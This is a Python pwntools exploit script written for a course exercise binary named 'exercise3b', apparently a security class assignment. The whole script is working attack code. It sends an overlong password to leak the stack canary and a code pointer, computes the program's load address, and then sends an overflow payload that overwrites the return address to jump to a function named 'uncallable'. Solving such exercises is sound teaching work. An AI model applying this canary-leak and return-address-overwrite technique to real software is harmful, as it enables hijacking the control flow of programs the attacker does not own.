#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3b'
#exe = './exercise3b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


# solution:  
# Same: gdb / compiled 
# [rbp-0x98] -[rbp-0x20] => 0x98 - 0x20 = 0x78 = 120 => 112
# 1C Hex => 28 

idx_hello = 0x1288 # print hello address
print(hex(ELF(exe).symbols['uncallable'])) # 0x1269
uncall = 0x1269
#print(uncall)
ca_leak = b'A'*111

r = start()
r.recvuntil(b'password:\n')
r.sendline(ca_leak)
r.recvuntil(b"Well of course ")
ca_back = r.recvuntil(b' is not the password\n')

canary = ca_back[:-21][112:]
canary_add, leak_add = canary[:4], canary[4:]
addr_ = int.from_bytes(leak_add,'little') - idx_hello 
leak_add = int.from_bytes(leak_add,'little')
uncall_addr = uncall + addr_ 
shellcode = b'A'*112 + canary_add + p64(leak_add) + b'B'*28 + p64(uncall_addr) 
#shellcode = b'A'*112 + canary_add + b'B'*36 + p64(uncall_addr) 

r.recvuntil(b'password:\n')
r.sendline(shellcode)
print(r.recvall())
